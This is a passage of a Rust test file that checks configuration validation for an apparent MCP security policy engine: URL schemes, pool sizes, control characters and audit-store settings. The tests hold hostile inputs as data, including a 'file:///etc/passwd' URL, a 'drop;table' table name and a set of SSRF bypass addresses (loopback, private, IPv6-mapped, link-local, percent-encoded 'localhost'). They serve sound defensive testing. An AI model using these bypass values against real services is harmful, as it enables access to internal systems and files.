        "Error should mention field: {err}"
    );
    assert!(
        err.contains("must be > 0"),
        "Error should mention > 0: {err}"
    );
}

// ── FIND-R110-CFG-001: AuditExportConfig webhook HTTPS-only ──────────────────

#[test]
fn test_validate_webhook_url_http_rejected() {
    let cfg = crate::PolicyConfig {
        audit_export: crate::detection::AuditExportConfig {
            webhook_url: Some("http://siem.example.com/ingest".to_string()),
            ..Default::default()
        },
        ..crate::PolicyConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("HTTPS"),
        "HTTP webhook should require HTTPS, got: {err}"
    );
}

#[test]
fn test_validate_webhook_url_https_accepted() {
    let cfg = crate::PolicyConfig {
        audit_export: crate::detection::AuditExportConfig {
            webhook_url: Some("https://siem.example.com/ingest".to_string()),
            ..Default::default()
        },
        ..crate::PolicyConfig::default()
    };
    // Should not error on the scheme itself (may still error on private IP etc.)
    // We just verify the scheme check passes with a public HTTPS URL
    let result = cfg.validate();
    assert!(
        result.is_ok(),
        "https:// webhook should be accepted, got: {:?}",
        result.err()
    );
}

#[test]
fn test_validate_webhook_url_ftp_rejected() {
    let cfg = crate::PolicyConfig {
        audit_export: crate::detection::AuditExportConfig {
            webhook_url: Some("ftp://siem.example.com/ingest".to_string()),
            ..Default::default()
        },
        ..crate::PolicyConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("HTTPS"),
        "ftp:// webhook should be rejected with HTTPS message, got: {err}"
    );
}

// ── FIND-R110-CFG-002: ClusterConfig redis URL scheme + pool size ─────────────

#[test]
fn test_cluster_redis_url_invalid_scheme_rejected() {
    let cfg = crate::cluster::ClusterConfig {
        redis_url: "http://localhost:6379".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("redis://") || err.contains("rediss://"),
        "invalid scheme should be rejected, got: {err}"
    );
}

#[test]
fn test_cluster_redis_url_file_scheme_rejected() {
    let cfg = crate::cluster::ClusterConfig {
        redis_url: "file:///etc/passwd".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("redis://") || err.contains("rediss://"),
        "file:// scheme should be rejected, got: {err}"
    );
}

#[test]
fn test_cluster_redis_url_redis_scheme_accepted() {
    let cfg = crate::cluster::ClusterConfig {
        redis_url: "redis://my-redis:6379".to_string(),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "redis:// should be accepted");
}

#[test]
fn test_cluster_redis_url_rediss_scheme_accepted() {
    let cfg = crate::cluster::ClusterConfig {
        redis_url: "rediss://my-redis-tls:6380".to_string(),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "rediss:// should be accepted");
}

#[test]
fn test_cluster_pool_size_zero_rejected() {
    let cfg = crate::cluster::ClusterConfig {
        redis_pool_size: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("redis_pool_size") && err.contains(">= 1"),
        "zero pool size should be rejected, got: {err}"
    );
}

#[test]
fn test_cluster_pool_size_too_large_rejected() {
    let cfg = crate::cluster::ClusterConfig {
        redis_pool_size: 1000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("redis_pool_size") && err.contains("exceeds maximum"),
        "oversized pool size should be rejected, got: {err}"
    );
}

#[test]
fn test_cluster_pool_size_valid_accepted() {
    let cfg = crate::cluster::ClusterConfig {
        redis_pool_size: 16,
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "valid pool size should be accepted");
}

// ════════════════════════════════════════════════════════
// FIND-R184-005: ClusterConfig key_prefix hash tag tests
// ════════════════════════════════════════════════════════

#[test]
fn test_cluster_key_prefix_with_open_brace_rejected() {
    let cfg = crate::cluster::ClusterConfig {
        key_prefix: "vellaveto{slot}:".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("hash tag"),
        "Expected 'hash tag' error, got: {err}"
    );
}

#[test]
fn test_cluster_key_prefix_with_close_brace_rejected() {
    let cfg = crate::cluster::ClusterConfig {
        key_prefix: "vellaveto}:".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("hash tag"),
        "Expected 'hash tag' error, got: {err}"
    );
}

#[test]
fn test_cluster_key_prefix_without_braces_accepted() {
    let cfg = crate::cluster::ClusterConfig {
        key_prefix: "vellaveto:".to_string(),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "key_prefix without braces should be accepted"
    );
}

// ════════════════════════════════════════════════════════
// FIND-R125: Elicitation/Sampling config validation tests
// ════════════════════════════════════════════════════════

#[test]
fn test_elicitation_config_validate_empty_blocked_field_type() {
    let cfg = crate::ElicitationConfig {
        enabled: true,
        blocked_field_types: vec!["password".to_string(), "".to_string()],
        max_per_session: 5,
        ..Default::default()
    };
    let result = cfg.validate();
    assert!(
        result.is_err(),
        "should reject empty blocked_field_types entry"
    );
    assert!(
        result.unwrap_err().contains("is empty"),
        "error should mention empty"
    );
}

#[test]
fn test_elicitation_config_validate_control_chars_in_blocked_field_type() {
    let cfg = crate::ElicitationConfig {
        enabled: true,
        blocked_field_types: vec!["pass\x00word".to_string()],
        max_per_session: 5,
        ..Default::default()
    };
    let result = cfg.validate();
    assert!(
        result.is_err(),
        "should reject control characters in blocked_field_types"
    );
    assert!(
        result.unwrap_err().contains("control"),
        "error should mention control characters"
    );
}

#[test]
fn test_elicitation_config_validate_oversized_blocked_field_type() {
    let cfg = crate::ElicitationConfig {
        enabled: true,
        blocked_field_types: vec![
            "x".repeat(crate::mcp_protocol::MAX_BLOCKED_FIELD_TYPE_LENGTH + 1)
        ],
        max_per_session: 5,
        ..Default::default()
    };
    let result = cfg.validate();
    assert!(
        result.is_err(),
        "should reject oversized blocked_field_types entry"
    );
    assert!(
        result.unwrap_err().contains("exceeds max"),
        "error should mention exceeds max"
    );
}

#[test]
fn test_elicitation_config_validate_valid_blocked_field_types() {
    let cfg = crate::ElicitationConfig {
        enabled: true,
        blocked_field_types: vec![
            "password".to_string(),
            "ssn".to_string(),
            "credit_card".to_string(),
        ],
        max_per_session: 5,
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "valid config should pass validation"
    );
}

#[test]
fn test_sampling_config_validate_empty_allowed_model() {
    let cfg = crate::SamplingConfig {
        enabled: true,
        allowed_models: vec!["claude-3-opus".to_string(), "".to_string()],
        block_if_contains_tool_output: true,
        max_per_session: 10,
        ..Default::default()
    };
    let result = cfg.validate();
    assert!(result.is_err(), "should reject empty allowed_models entry");
    assert!(
        result.unwrap_err().contains("is empty"),
        "error should mention empty"
    );
}

#[test]
fn test_sampling_config_validate_control_chars_in_allowed_model() {
    let cfg = crate::SamplingConfig {
        enabled: true,
        allowed_models: vec!["claude\x07-3".to_string()],
        block_if_contains_tool_output: true,
        max_per_session: 10,
        ..Default::default()
    };
    let result = cfg.validate();
    assert!(
        result.is_err(),
        "should reject control characters in allowed_models"
    );
    assert!(
        result.unwrap_err().contains("control"),
        "error should mention control characters"
    );
}

#[test]
fn test_sampling_config_validate_oversized_allowed_model() {
    let cfg = crate::SamplingConfig {
        enabled: true,
        allowed_models: vec!["x".repeat(crate::mcp_protocol::MAX_ALLOWED_MODEL_LENGTH + 1)],
        block_if_contains_tool_output: true,
        max_per_session: 10,
        ..Default::default()
    };
    let result = cfg.validate();
    assert!(
        result.is_err(),
        "should reject oversized allowed_models entry"
    );
    assert!(
        result.unwrap_err().contains("exceeds max"),
        "error should mention exceeds max"
    );
}

#[test]
fn test_sampling_config_validate_valid_allowed_models() {
    let cfg = crate::SamplingConfig {
        enabled: true,
        allowed_models: vec!["claude-3-opus".to_string(), "gpt-4".to_string()],
        block_if_contains_tool_output: true,
        max_per_session: 10,
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "valid config should pass validation"
    );
}

#[test]
fn test_sampling_config_default_has_max_per_session() {
    let cfg = crate::SamplingConfig::default();
    assert_eq!(
        cfg.max_per_session, 10,
        "default max_per_session should be 10"
    );
}

// ═══════════════════════════════════════════════════════════════════════════════
// FIND-R115-063: ZK audit key path validation
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_zk_audit_key_path_rejects_control_chars() {
    let cfg = crate::zk_audit::ZkAuditConfig {
        enabled: true,
        proving_key_path: Some("/keys/proving\x00key.bin".to_string()),
        ..crate::zk_audit::ZkAuditConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("control"),
        "should reject null byte in path, got: {err}"
    );
}

#[test]
fn test_zk_audit_key_path_rejects_oversized() {
    let long_path = "/".to_string() + &"a".repeat(4100);
    let cfg = crate::zk_audit::ZkAuditConfig {
        enabled: true,
        proving_key_path: Some(long_path),
        ..crate::zk_audit::ZkAuditConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("exceeds max length"),
        "should reject oversized path, got: {err}"
    );
}

#[test]
fn test_zk_audit_key_path_rejects_empty() {
    let cfg = crate::zk_audit::ZkAuditConfig {
        enabled: true,
        proving_key_path: Some("".to_string()),
        ..crate::zk_audit::ZkAuditConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("must not be empty"),
        "should reject empty path, got: {err}"
    );
}

#[test]
fn test_zk_audit_verifying_key_path_rejects_newline() {
    let cfg = crate::zk_audit::ZkAuditConfig {
        enabled: true,
        verifying_key_path: Some("/keys/verify\nkey.bin".to_string()),
        ..crate::zk_audit::ZkAuditConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("control"),
        "should reject newline in path, got: {err}"
    );
}

// ═══════════════════════════════════════════════════════════════════════════════
// FIND-R115-064: Projector default_model_family validation
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_projector_rejects_oversized_model_family() {
    let cfg = crate::projector::ProjectorConfig {
        default_model_family: "custom:".to_string() + &"x".repeat(200),
        ..crate::projector::ProjectorConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("exceeds max length"),
        "should reject oversized model family, got: {err}"
    );
}

#[test]
fn test_projector_rejects_control_chars_in_model_family() {
    let cfg = crate::projector::ProjectorConfig {
        default_model_family: "custom:evil\x01model".to_string(),
        ..crate::projector::ProjectorConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("control"),
        "should reject control chars in model family, got: {err}"
    );
}

#[test]
fn test_projector_rejects_custom_prefix_empty_name() {
    let cfg = crate::projector::ProjectorConfig {
        default_model_family: "custom:".to_string(),
        ..crate::projector::ProjectorConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("non-empty name"),
        "should reject custom: with empty name, got: {err}"
    );
}

#[test]
fn test_projector_accepts_valid_custom_family() {
    let cfg = crate::projector::ProjectorConfig {
        default_model_family: "custom:my-model-v2".to_string(),
        ..crate::projector::ProjectorConfig::default()
    };
    assert!(cfg.validate().is_ok(), "valid custom family should pass");
}

// ── FIND-R137: Config per-entry validation tests ──────────

#[test]
fn test_resource_indicator_rejects_empty_entry() {
    let cfg = crate::mcp_protocol::ResourceIndicatorConfig {
        enabled: true,
        allowed_resources: vec!["https://api.example.com".to_string(), "".to_string()],
        require_resource: false,
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("is empty"), "should reject empty entry: {err}");
}

#[test]
fn test_resource_indicator_rejects_control_chars() {
    let cfg = crate::mcp_protocol::ResourceIndicatorConfig {
        enabled: true,
        allowed_resources: vec!["https://api\x00.example.com".to_string()],
        require_resource: false,
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("control"),
        "should reject control chars: {err}"
    );
}

#[test]
fn test_cimd_rejects_empty_required_capability() {
    let cfg = crate::mcp_protocol::CimdConfig {
        enabled: true,
        required_capabilities: vec!["tools".to_string(), "".to_string()],
        blocked_capabilities: vec![],
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("is empty"), "should reject empty: {err}");
}

#[test]
fn test_cimd_rejects_empty_blocked_capability() {
    let cfg = crate::mcp_protocol::CimdConfig {
        enabled: true,
        required_capabilities: vec![],
        blocked_capabilities: vec!["".to_string()],
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("is empty"), "should reject empty: {err}");
}

#[test]
fn test_step_up_auth_rejects_empty_trigger_tool() {
    let cfg = crate::mcp_protocol::StepUpAuthConfig {
        enabled: true,
        trigger_tools: vec!["db_*".to_string(), "".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("is empty"), "should reject empty: {err}");
}

#[test]
fn test_step_up_auth_rejects_control_char_trigger() {
    let cfg = crate::mcp_protocol::StepUpAuthConfig {
        enabled: true,
        trigger_tools: vec!["db_\x1b[31m_evil".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("control"),
        "should reject control chars: {err}"
    );
}

#[test]
fn test_async_tasks_rejects_zero_nonces_with_replay_protection() {
    let cfg = crate::mcp_protocol::AsyncTaskConfig {
        replay_protection: true,
        max_nonces: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("max_nonces must be > 0"),
        "should reject zero nonces: {err}"
    );
}

#[test]
fn test_async_tasks_allows_zero_nonces_without_replay_protection() {
    let cfg = crate::mcp_protocol::AsyncTaskConfig {
        replay_protection: false,
        max_nonces: 0,
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "zero nonces without replay_protection should be ok"
    );
}

// ═══════════════════════════════════════════════════════════════
// AuditStoreConfig validation tests (IMP-R198-001)
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_audit_store_config_default_passes() {
    let cfg = crate::AuditStoreConfig::default();
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_audit_store_config_disabled_with_bad_pool_size_fails() {
    // FIND-R203-005: Numeric bounds are checked unconditionally — pool_size=0
    // must be rejected even when the store is disabled.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        pool_size: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("pool_size"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_rejects_control_chars_in_url() {
    // FIND-R198-005: Even when disabled, control chars are rejected
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        database_url: Some("postgres://user\x00@host/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("control or format"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_rejects_bad_table_name() {
    // FIND-R198-005: Even when disabled, table name charset is validated
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        table_name: "drop;table".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("alphanumeric"), "got: {err}");
}

#[test]
fn test_audit_store_config_enabled_postgres_no_url_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: None,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("database_url is required"), "got: {err}");
}

#[test]
fn test_audit_store_config_enabled_postgres_empty_url_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("   ".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("must not be empty"), "got: {err}");
}

#[test]
fn test_audit_store_config_wrong_scheme_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("mysql://host/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("postgres://"), "got: {err}");
}

#[test]
fn test_audit_store_config_ssrf_localhost_rejected() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@localhost:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("private/loopback"), "got: {err}");
}

#[test]
fn test_audit_store_config_ssrf_loopback_ip_rejected() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@127.0.0.1:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("private/loopback"), "got: {err}");
}

#[test]
fn test_audit_store_config_ssrf_private_ip_rejected() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@10.0.0.1:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("private/loopback"), "got: {err}");
}

#[test]
fn test_audit_store_config_ssrf_ipv6_loopback_rejected() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@[::1]:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("private/loopback"), "got: {err}");
}

#[test]
fn test_audit_store_config_url_too_long() {
    let long_url = format!("postgres://user:pass@host/{}", "x".repeat(2100));
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some(long_url),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("length") && err.contains("exceeds"),
        "got: {err}"
    );
}

#[test]
fn test_audit_store_config_valid_external_postgres() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com:5432/mydb".to_string()),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_audit_store_config_pool_size_zero_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        pool_size: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("pool_size"), "got: {err}");
}

#[test]
fn test_audit_store_config_pool_size_over_max_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        pool_size: 101,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("pool_size"), "got: {err}");
}

#[test]
fn test_audit_store_config_table_name_empty_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        table_name: "".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("table_name"), "got: {err}");
}

#[test]
fn test_audit_store_config_table_name_digit_start_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        table_name: "1table".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("must not start with a digit"), "got: {err}");
}

#[test]
fn test_audit_store_config_sink_buffer_zero_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        sink_buffer_size: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("sink_buffer_size"), "got: {err}");
}

#[test]
fn test_audit_store_config_flush_interval_zero_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        flush_interval_ms: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("flush_interval_ms"), "got: {err}");
}

#[test]
fn test_audit_store_config_batch_insert_over_max_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        batch_insert_size: 1001,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("batch_insert_size"), "got: {err}");
}

#[test]
fn test_audit_store_config_connect_timeout_zero_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        connect_timeout_secs: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("connect_timeout_secs"), "got: {err}");
}

#[test]
fn test_audit_store_config_debug_redacts_url() {
    let cfg = crate::AuditStoreConfig {
        database_url: Some("postgres://secret:hunter2@host/db".to_string()),
        ..Default::default()
    };
    let debug_output = format!("{cfg:?}");
    assert!(
        !debug_output.contains("hunter2"),
        "password leaked in Debug: {debug_output}"
    );
    assert!(
        debug_output.contains("[REDACTED]"),
        "missing redaction: {debug_output}"
    );
}

// ═══════════════════════════════════════════════════════════════
// Phase 43: Additional AuditStoreConfig validation tests
// covering batch_insert_size == 0, sink_buffer_size > max,
// table_name with special chars (enabled mode), and
// valid postgresql:// scheme. (IMP-R198-P43)
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_audit_store_config_disabled_default_validates_ok() {
    // When disabled (default), validate() succeeds immediately after
    // the always-applied charset checks for url/table_name.
    let cfg = crate::AuditStoreConfig::default();
    assert!(!cfg.enabled, "default should be disabled");
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_audit_store_config_batch_insert_size_zero_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        batch_insert_size: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("batch_insert_size"), "got: {err}");
}

#[test]
fn test_audit_store_config_sink_buffer_size_over_max_fails() {
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        sink_buffer_size: 10_001,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("sink_buffer_size"), "got: {err}");
}

#[test]
fn test_audit_store_config_table_name_special_chars_fails_when_enabled() {
    // Enabled mode rejects special chars via the always-applied charset check
    // (executed before the `if !self.enabled { return Ok(()) }` guard).
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        table_name: "audit-entries".to_string(), // hyphen not allowed
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("alphanumeric"), "got: {err}");
}

#[test]
fn test_audit_store_config_postgresql_scheme_accepted() {
    // Both postgres:// and postgresql:// must be accepted.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgresql://user:pass@db.example.com/db".to_string()),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "postgresql:// scheme should be accepted"
    );
}

#[test]
fn test_audit_store_config_http_scheme_fails() {
    // http:// is not a valid database URL scheme.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("http://db.example.com/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("postgres://"), "got: {err}");
}

#[test]
fn test_audit_store_config_pool_size_boundary_one_ok() {
    // pool_size == 1 is the minimum valid value.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        pool_size: 1,
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_audit_store_config_pool_size_boundary_max_ok() {
    // pool_size == MAX_POOL_SIZE (100) is the maximum valid value.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@db.example.com/db".to_string()),
        pool_size: 100,
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════════
// Round 200: IPv6-mapped IPv4, unique-local, link-local, and
// percent-encoded hostname SSRF bypass tests
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_audit_store_config_ssrf_ipv6_mapped_ipv4_loopback_rejected() {
    // FIND-R200-001: ::ffff:127.0.0.1 embeds IPv4 loopback inside IPv6.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@[::ffff:127.0.0.1]:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("private/loopback") || err.contains("IPv6-mapped"),
        "got: {err}"
    );
}

#[test]
fn test_audit_store_config_ssrf_ipv6_mapped_ipv4_private_rejected() {
    // FIND-R200-001: ::ffff:10.0.0.1 embeds private IPv4 inside IPv6.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@[::ffff:10.0.0.1]:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("private/loopback") || err.contains("IPv6-mapped"),
        "got: {err}"
    );
}

#[test]
fn test_audit_store_config_ssrf_ipv6_mapped_ipv4_link_local_rejected() {
    // FIND-R200-001: ::ffff:169.254.1.1 embeds link-local IPv4 inside IPv6.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@[::ffff:169.254.1.1]:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("private/loopback") || err.contains("IPv6-mapped"),
        "got: {err}"
    );
}

#[test]
fn test_audit_store_config_ssrf_ipv6_unique_local_rejected() {
    // FIND-R200-001: fc00::/7 unique-local address.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@[fd12:3456:789a::1]:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("unique-local"), "got: {err}");
}

#[test]
fn test_audit_store_config_ssrf_ipv6_link_local_rejected() {
    // FIND-R200-001: fe80::/10 link-local address.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@[fe80::1]:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("link-local"), "got: {err}");
}

#[test]
fn test_audit_store_config_ssrf_percent_encoded_hostname_rejected() {
    // FIND-R200-007: Percent-encoded hostnames could bypass text checks.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@%6Cocal%68ost:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("percent-encoding"), "got: {err}");
}

#[test]
fn test_audit_store_config_valid_ipv6_public_address_ok() {
    // A public IPv6 address should be accepted.
    let cfg = crate::AuditStoreConfig {
        enabled: true,
        backend: vellaveto_types::AuditStoreBackend::Postgres,
        database_url: Some("postgres://user:pass@[2001:db8::1]:5432/db".to_string()),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "public IPv6 should be accepted");
}

// ═══════════════════════════════════════════════════════════════════════
// Round 203: SSRF + numeric bounds unconditional validation
// FIND-R203-003: SSRF check runs even when enabled=false
// FIND-R203-005: Numeric bounds run even when enabled=false
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn test_audit_store_config_disabled_ssrf_localhost_rejected() {
    // FIND-R203-003: SSRF check must reject private/loopback URLs even when
    // the store is disabled. A disabled config with a bad URL is still invalid
    // because enabled=true could be set later without re-validation.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        database_url: Some("postgres://user:pass@localhost:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("private/loopback"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_ssrf_loopback_ip_rejected() {
    // FIND-R203-003: 127.0.0.1 rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        database_url: Some("postgres://user:pass@127.0.0.1:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("private/loopback"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_ssrf_private_ip_rejected() {
    // FIND-R203-003: RFC-1918 private range rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        database_url: Some("postgres://user:pass@10.0.0.1:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("private/loopback"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_ssrf_ipv6_loopback_rejected() {
    // FIND-R203-003: IPv6 loopback [::1] rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        database_url: Some("postgres://user:pass@[::1]:5432/db".to_string()),
        ..Default::default()
    };
